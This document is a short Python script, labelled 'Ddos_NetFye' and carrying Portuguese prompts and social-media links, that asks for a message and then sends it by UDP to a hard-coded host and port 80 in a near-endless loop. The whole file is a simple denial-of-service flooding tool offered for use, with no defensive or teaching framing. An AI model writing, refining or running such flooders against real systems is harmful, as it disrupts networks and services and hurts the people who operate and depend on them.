import socket
import time
from colorama import init, Fore, Style
import pyfiglet

init()

host = "192.168.1.39"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("_____________________________________________________________________________________")
text = "Ddos_NetFye"
print(pyfiglet.figlet_format(text))
print("_____________________________________________________________________________________")
print("github: https://github.com/101Ruan")
print("instagram: https://instagram.com/Darkzero4913\n")
mensagem = input(Fore.BLUE + "digite uma mensagem: " + Style.RESET_ALL).encode()
if not mensagem:
   print(Fore.RED + "mensagem vazia" + Style.RESET_ALL)
   time.sleep(1)
   exit()

print(Fore.CYAN + "enviando mensagem em 5s..." + Style.RESET_ALL)
time.sleep(5)

print(Fore.GREEN + "mensagem enviada com sucessso!" + Style.RESET_ALL)
time.sleep(3)
for i in range(1,10000000000):
    try:
       s.sendto(mensagem, (host, port))
    
       print(Fore.RED + f'mensagem enviada: {mensagem.decode()}' + Style.RESET_ALL)
       time.sleep(0.01)
    except Exception as e:
        print(f"erro {e}")
        break
        
